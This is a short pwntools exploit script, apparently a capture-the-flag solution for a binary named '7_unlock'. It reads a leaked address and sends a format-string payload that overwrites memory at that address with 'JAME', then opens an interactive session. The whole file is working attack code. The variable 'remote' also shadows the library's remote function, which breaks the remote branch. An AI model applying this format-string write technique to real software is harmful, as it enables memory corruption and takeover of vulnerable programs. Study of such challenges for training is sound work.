from pwn import *

#context.log_level = "debug"
remote = False

IP = ""
PORT = ""
FILENAME = "./7_unlock"

if remote:
    p = remote(IP, PORT)
    elf = ELF(FILENAME)
else:
    p = process(FILENAME)
    elf = p.elf

p.recvuntil("last name is ")
leak = int(p.recvline()[:-1], 16)
log.info(hex(leak))

payload = b"A" + fmtstr_payload(7, {leak: "JAME"}, numbwritten=1)
p.sendline(payload)

p.interactive()
